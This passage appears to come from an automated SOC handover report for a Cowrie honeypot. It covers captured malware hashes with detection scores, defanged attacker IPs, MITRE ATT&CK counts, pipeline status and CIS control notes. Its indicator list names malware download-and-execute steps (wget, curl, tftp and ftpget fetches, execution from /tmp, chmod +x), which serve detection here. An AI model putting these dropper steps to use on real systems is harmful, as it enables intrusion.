| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.103.15[.]75` | UA | CHP Zarko Alexandr Ivanovich | **100** ⚠️ | 1 |
| `37.255.205[.]216` | IR | Iran Telecommunication Company PJS | **100** ⚠️ | 2 |
| `186.242.162[.]94` | IN | Bharti Airtel Limited | **100** ⚠️ | 2 |
| `39.105.64[.]243` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 7 |
| `117.204.1[.]45` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 34 |
| `187.8.3[.]230` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `85.229.6[.]228` | SE | Telenor Sverige AB | **100** ⚠️ | 2 |
| `45.79.207[.]252` | US | Linode | **100** ⚠️ | 50 |
| `75.80.65[.]214` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `117.191.83[.]250` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 95 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 77 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 3 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 166 cases |
| Tool 34  | Credential Extractor        | ✅ 102 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (9.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 57 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 77 priority case(s) shown individually · 26 recon entry/entries in table (6 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-24T10:42:12Z_
